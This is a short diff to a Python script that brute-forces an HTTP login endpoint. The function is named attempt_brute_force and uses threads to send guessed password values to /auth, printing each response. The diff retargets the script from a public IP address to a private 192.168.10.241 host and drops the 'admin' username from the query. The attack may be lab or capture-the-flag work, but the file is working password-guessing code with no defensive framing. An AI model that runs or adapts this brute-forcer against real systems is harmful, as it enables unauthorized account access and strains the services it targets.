@@ -3,7 +3,7 @@ import requests
 import threading
 import time
 
-url = "http://43.201.41.58:3000"
+url = "http://192.168.10.241:80"
 size = 16
 used_dict = set()
 lock = threading.Lock()
@@ -35,7 +35,7 @@ def attempt_brute_force():
             while not stop_event.is_set():
                 try:
                     req = session.get(
-                        f"{url}/auth?username=admin&authType=password&value={test}",
+                        f"{url}/auth?password={test}",
                         timeout=5
                     )
                     print(f"tid={current_loop} | val={test} | code={req.status_code} | res={req.text}")
